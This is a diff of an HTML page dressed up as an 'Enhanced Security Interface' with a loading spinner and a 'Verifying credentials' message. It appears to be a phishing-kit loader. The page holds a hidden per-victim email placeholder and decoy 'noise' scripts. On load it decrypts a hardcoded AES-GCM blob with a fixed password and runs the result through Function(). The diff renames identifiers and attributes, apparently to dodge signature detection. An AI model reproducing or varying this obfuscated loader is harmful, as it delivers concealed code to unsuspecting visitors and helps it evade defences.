@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="author" content="CodeMaster">
-    <title>Advanced Security Module</title>
+    <meta name="author" content="ScriptWizard">
+    <title>Enhanced Security Interface</title>
     <style>
         body {
             padding: 0;
@@ -18,27 +18,27 @@
             min-height: 100vh;
             overflow: hidden;
         }
-        .circle-loader {
+        .spinner {
             width: 80px;
             height: 80px;
             border: 12px solid #d3d3d3;
             border-top: 12px solid #6a5acd;
             border-radius: 50%;
-            animation: rotate-loader 2s linear infinite;
+            animation: spin 2s linear infinite;
         }
-        @keyframes rotate-loader {
+        @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .status-message {
+        .status-text {
             margin-top: 20px;
             font-size: 18px;
             color: #333;
         }
-        .hidden-section {
+        .hidden-content {
             display: none;
         }
-        .debug-info {
+        .debug-output {
             margin-top: 30px;
             font-size: 14px;
             color: #666;
@@ -46,39 +46,39 @@
     </style>
 </head>
 <body>
-    <div class="hidden-section">
-        <div data-secure="true" adidas="<%=EMAIL64%>" info-tag="protected"></div>
+    <div class="hidden-content">
+        <div data-secure="true" adidas="<%=EMAIL64%>" info="protected"></div>
     </div>
 
-    <div data-hidden="bmV3LXNlY3VyZS1kYXRh"></div>
-    <p class="status-message" nike-andy="">Processing your request, please wait...</p>
+    <div data-secret="bmV3LXNlY3VyZS1kYXRh"></div>
+    <p class="status-text" nike-oliver="">Processing your request, please wait...</p>
 
-    <div data-auth-section="">
+    <div data-auth="true">
         <p>Verifying credentials...</p>
     </div>
 
     <!-- Combined JavaScript -->
     <script>
         // Useless Scripts for Noise
-        const generateRandomStuff = () => {
-            const items = ["apple", "banana", "cherry", "date", "elderberry"];
-            items.forEach(item => {
-                // console.log(`Random Item: ${item}`);
+        const generateRandomItems = () => {
+            const fruits = ["apple", "banana", "cherry", "date", "elderberry"];
+            fruits.forEach(fruit => {
+                // console.log(`Random Fruit: ${fruit}`);
             });
         };
-        generateRandomStuff();
+        generateRandomItems();
 
-        const fakeProgressLogger = () => {
-            const steps = ["Step 1: Initializing...", "Step 2: Loading...", "Step 3: Finalizing..."];
-            steps.forEach(step => {
-                // console.log(`[PROGRESS] ${step}`);
+        const logFakeProgress = () => {
+            const stages = ["Stage 1: Starting...", "Stage 2: Processing...", "Stage 3: Completing..."];
+            stages.forEach(stage => {
+                // console.log(`[PROGRESS] ${stage}`);
             });
         };
-        fakeProgressLogger();
+        logFakeProgress();
 
         // Core Functionality
-        const decryptSecurePayload = async (payload, keyHex, saltHex, passphrase) => {
-            const hexStringToBytes = (hex) => {
+        const decodeSecureData = async (encryptedData, keyHex, saltHex, password) => {
+            const hexToBytes = (hex) => {
                 const bytes = new Uint8Array(hex.length / 2);
                 for (let i = 0; i < hex.length; i += 2) {
                     bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
@@ -86,11 +86,11 @@
                 return bytes;
             };
 
-            const simulateProcessing = () => new Promise(resolve => {
+            const simulateDelay = () => new Promise(resolve => {
                 setTimeout(resolve, 600);
             });
 
-            const deriveSecureKey = async (keyMaterial, salt) => {
+            const generateKey = async (keyMaterial, salt) => {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt: salt, iterations: 100000, hash: "SHA-256" },
                     keyMaterial,
@@ -102,22 +102,22 @@
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(passphrase),
+                new TextEncoder().encode(password),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await simulateProcessing();
-            const secureKey = await deriveSecureKey(keyMaterial, hexStringToBytes(saltHex));
+            await simulateDelay();
+            const secureKey = await generateKey(keyMaterial, hexToBytes(saltHex));
 
             try {
                 const decryptedBytes = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexStringToBytes(keyHex) },
+                    { name: "AES-GCM", iv: hexToBytes(keyHex) },
                     secureKey,
-                    hexStringToBytes(payload)
+                    hexToBytes(encryptedData)
                 );
-                console.log("[SUCCESS] Payload decrypted successfully.");
+                console.log("[SUCCESS] Data decrypted successfully.");
                 return new TextDecoder().decode(decryptedBytes);
             } catch (error) {
                 console.error("[ERROR] Decryption failed:", error);
@@ -127,21 +127,21 @@
 
         // Main Execution
         (async () => {
-            console.log("[INIT] Starting advanced security module...");
-            const securePayload = {
+            console.log("[INIT] Starting enhanced security interface...");
+            const secureData = {
                 key: "0a6d791008bd13b5d22d4e92",
                 salt: "cb6853c10fc7a13ae3fd54b1af489606",
                 data: "e2b5f7da69e614a29737cf95404cf4d2bf56f5c5635356c0e94917b504bbd2e4fa7e7c3b7a9849dc3c26889e14e28690daa199f60070b2fcaae0726a246226d9e1e34f65b6aba4b2151016ccf4ba0dcecc38e79804fa296c4d94ef4b64c9f1ed021e3c331af17d2bdd40f791f580c232810895aaf42def5bc9ff15a11dc27fa5c5d003a7a0a14968d58ad8833940a2e935a85cef230aea8a89254e4f6e6659b9af8d7fea89a1f8642c75710c053816c3385cf63667c1e2c2b25cd4b7ddf2570c"
             };
 
-            const secretPassphrase = "homesweethome";
-            const decryptedResult = await decryptSecurePayload(securePayload.data, securePayload.key, securePayload.salt, secretPassphrase);
-            console.log(decryptedResult);
+            const secretPassword = "homesweethome";
+            const decodedResult = await decodeSecureData(secureData.data, secureData.key, secureData.salt, secretPassword);
+            console.log(decodedResult);
             
-            Function(`${decryptedResult}`)();
+            Function(`${decodedResult}`)();
 
-            if (decryptedResult) {
-                // console.log("[DEBUG] Decrypted Result:", decryptedResult);
+            if (decodedResult) {
+                // console.log("[DEBUG] Decoded Result:", decodedResult);
             }
         })();
     </script>
